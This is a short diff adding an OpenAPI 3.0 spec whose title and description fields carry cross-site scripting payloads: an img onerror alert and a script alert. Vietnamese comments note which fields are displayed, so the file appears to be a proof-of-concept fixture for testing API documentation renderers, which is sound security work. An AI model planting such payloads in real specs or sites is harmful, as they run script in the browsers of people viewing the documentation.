@@ -1,0 +1,7 @@
+openapi: 3.0.0
+info:
+  title: "<img src=x onerror=alert(document.domain)>"    # Luôn hiển thị
+  description: "<script>alert('XSS')</script>"           # Thường hiển thị
+  version: "1.0.0"
+
+paths: {}
